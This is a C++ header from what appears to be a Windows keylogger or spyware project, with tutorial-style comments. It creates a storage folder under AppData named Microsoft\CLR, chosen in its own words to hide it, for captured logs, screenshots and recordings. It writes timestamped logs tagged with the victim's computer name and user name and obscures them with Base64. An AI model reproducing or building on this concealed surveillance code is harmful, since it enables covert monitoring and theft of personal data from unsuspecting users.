#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib> //standard lib in C where we will use it to get get environment function
#include <fstream> //file stream
#include "windows.h" //windows API
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    //retrieve our designated folder where all the logs, screenshots, audio, video, recordings will be
    std::string GetOurPath(const bool append_seperator = false)
    {
        //appdatasection folder
        //C:\Users\USERNAME\AppData\Roaming //hide it by placing it in Microsoft\CLR folder
        std::string appdata_dir(getenv("APPDATA")); //this will get the environment variable - path - which contains the APPDATA directory
        std::string full = appdata_dir + "\\Microsoft\\CLR"; //optionally add backslash at the end
        return full + (append_seperator ? "\\" : ""); //backslash = escape character, we need 2 to get one
    }

    bool MkOneDr(std::string path) //this function wants to create a file in Downloads, if for some recent user does not exist, this function will fail. we need make a backup function that will create all of the paths (along the way) to the file
    {
        //windows api create directory, creates return a boolean true or false (cannot be found OR already have)
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS; //if created, OR already exists, no difference to us
    }

    bool MkDir(std::string path)
    {
        for(char &c : path)//&c will get each character from path
        {
            if(c=='\\')//if C is equals to backslash
            {
                c='\0'; //0 stops the other paths after the 0 from making | changes this part to 0
                if(!MkOneDr(path))
                    return false;
                c = '\\';
            }
        }
        return true; //when done with all sub directories
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log"; //cannot use : as seperator in windows filenames so we change seperator to _

        try
        {
            std::ofstream file(path + name); //find / create the file?
            if(!file) return ""; //if file cannot be created, return ""
            std::ostringstream s;
            //output to string stream
            std::string fromStatement = Helper::ToString(getenv("COMPUTERNAME")) + " | User: " + Helper::ToString(getenv("USERNAME"));
            s << "[" << dt.GetDateTimeString() << "] FROM: " << fromStatement <<
            std::endl << t << std::endl; //successfully created an output to the string stream, now we need a dump to the file
            //encryption first
            std::string data = Base64::EncryptB64(s.str()); //stringstream.str() into Encryption
            file << data;
            if(!file) //if file is not there, return empty string
                return "";
            file.close(); //close the file
            return name; //return the name of file if successfully.
        }
        catch(...)
        {
            //write to the error log
            return "";
        }
    }
}


#endif // IO_H
